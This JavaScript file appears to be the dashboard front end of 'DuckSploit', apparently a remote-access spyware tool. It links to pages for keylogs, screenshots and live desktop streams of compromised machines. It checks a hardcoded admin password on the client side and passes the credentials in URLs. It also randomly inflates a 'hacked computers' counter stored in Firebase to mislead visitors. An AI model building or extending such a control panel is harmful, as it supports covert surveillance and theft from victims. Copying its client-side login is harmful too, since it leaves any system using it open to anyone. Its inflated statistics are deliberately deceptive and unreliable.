function logincheck() {
	var logindatas = location.search.substring(1);
	var loginarray = logindatas.split("|");
	// fetch('./data/login.txt')
	 // .then(response => response.text())
	 // .then(data => {
	  // loginjson = data;
	// });
	loginjson = '{"username": "DSadmin","password": "ducksploit"}';
	const maplogin = new Map(Object.entries(JSON.parse(loginjson)));
	var username = loginarray[0];
	var pwd = loginarray[1];

	if (maplogin.get('username') == loginarray[0]) {
		if (maplogin.get('password') == loginarray[1]) {
			try {
			  document.getElementById("link_settings").setAttribute('href', "settings.html?"+username+"|"+pwd);
			}
			catch (error) {}
			try {
			  document.getElementById("link_keyloggs").setAttribute('href', "keyloggs.html?"+username+"|"+pwd);
			}
			catch (error) {}
			try {
			  document.getElementById("link_screenshots").setAttribute('href', "screenshot.html?"+username+"|"+pwd);
			}
			catch (error) {}
			try {
			  document.getElementById("link_desktopstream").setAttribute('href', "desktop_stream.html?"+username+"|"+pwd);
			}
			catch (error) {}
			try {
			  document.getElementById("link_website").setAttribute('href', "dedicatedwebsite.html?"+username+"|"+pwd);
			}
			catch (error) {}
			try {
			  document.getElementById("link_dashboard").setAttribute('href', "index.html?"+username+"|"+pwd);
			}
			catch (error) {}
		} 
		else
		{
			alert("Bad login infos");
			document.location.replace("./login.html");
		}
	} 
	else
	{
		alert("Bad login infos");
		document.location.replace("./login.html");
	}
}

function viewwebsite() {
	window.open("./sites/index.html");
}


fetch('https://discord.com/api/v9/invites/sTVWespH4M?with_counts=true&with_expiration=true')
 .then(response => response.text())
 .then(data => {
	var loginjson = data;
	// get members count discord
	const map = new Map(Object.entries(JSON.parse(loginjson)));
	document.getElementById("discord_members").innerHTML = map.get('approximate_member_count');
})
var ip = self.location.host;
fetch('http://ip-api.com/json/'+ip)
 .then(response => response.text())
 .then(data => {
	const map2 = new Map(Object.entries(JSON.parse(data)));
	
	// get ip infos
	document.getElementById('info_isp').innerHTML = map2.get('isp');
	document.getElementById('info_region').innerHTML = map2.get('regionName');
	document.getElementById('info_city').innerHTML = map2.get('city');
	document.getElementById('info_country').innerHTML = map2.get('country');
	document.getElementById('info_countrycode').innerHTML = map2.get('countryCode');
	document.getElementById('info_ipaddress').innerHTML = map2.get('query');
	
	isp = map2.get('isp');
	region = map2.get('regionName');
	city = map2.get('city');
	country = map2.get('country');
	countrycode = map2.get('countryCode');
	query = map2.get('query');
	
	// geolocation
	loc = "https://maps.google.com/maps?q="+map2.get('lat')+", "+map2.get('lon')+"&z=15&output=embed";
	document.getElementById('serverloc').src = loc;
})

fetch('https://dsrestapi-default-rtdb.firebaseio.com/data.json')
 .then(response => response.text())
 .then(data => {
	const map3 = new Map(Object.entries(JSON.parse(data)));
	
	// get ds infos
	document.getElementById('hacker_computers').innerHTML = map3.get('hacked_computers');
	document.getElementById('new_users').innerHTML = map3.get('members_today')+"+";
	
	rdm = Math.round(Math.random() * (100 - 0.0) + 0);
	if (rdm == 3)
	{
		map3.set("hacked_computers",map3.get('hacked_computers')+1);
		fetch("https://dsrestapi-default-rtdb.firebaseio.com/data.json", {
		  method: "PUT",
		  headers: {'Content-Type': 'application/json'}, 
		  body: JSON.stringify(Object.fromEntries(map3))
		}).then(res => {
		  console.log("Request complete!");
		});
	}
})

function download(filename, text) {
  var element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
  element.setAttribute('download', filename);

  element.style.display = 'none';
  document.body.appendChild(element);

  element.click();

  document.body.removeChild(element);
}


// chart
google.charts.load('current',{packages:['corechart']});
google.charts.setOnLoadCallback(drawChart);

function drawChart() {
// Set Data
var data = google.visualization.arrayToDataTable([
  ['Number', 'Day'],
  [50,1],[50,2],
  [60,8],[70,8],[80,9],
  [100,9],
]);
// Set Options
var options = {
  title: 'Logins',
  hAxis: {title: 'Date'},
  vAxis: {title: 'Number'},
  legend: 'none'
};
// Draw
var chart = new google.visualization.LineChart(document.getElementById('chart'));
chart.draw(data, options);
}


function downloadjson() {
	const infosmap = new Map();
	
	infosmap.set("ip",query);
	infosmap.set("country",country);
	infosmap.set("city",city);
	infosmap.set("region",region);
	infosmap.set("countrycode",countrycode);
	infosmap.set("isp",isp);
	
	download("infos.json",JSON.stringify(Object.fromEntries(infosmap)));
}